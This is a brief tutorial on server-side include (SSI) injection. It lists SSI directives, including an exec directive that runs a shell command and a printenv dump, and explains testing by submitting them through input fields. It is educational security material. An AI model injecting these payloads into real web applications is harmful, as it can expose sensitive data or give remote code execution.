Server-side includes (`SSI`) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:
```html
// Date
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```
The use of SSI on a web application can be identified by checking for extensions such as `.shtml`, `.shtm`, or `.stm`. Additionaly, some non-default server configurations allow other extensions such as `.html` to process SSI directives.

Testing for SSI injection is as easy as submitting payloads, such as the ones mentioned above, through input fields. The web server will then parse and execute the directives before rendering the page if the vulnerability is present. Successful SSI injection can lead to extracting sensitive information or even remote code execution (RCE).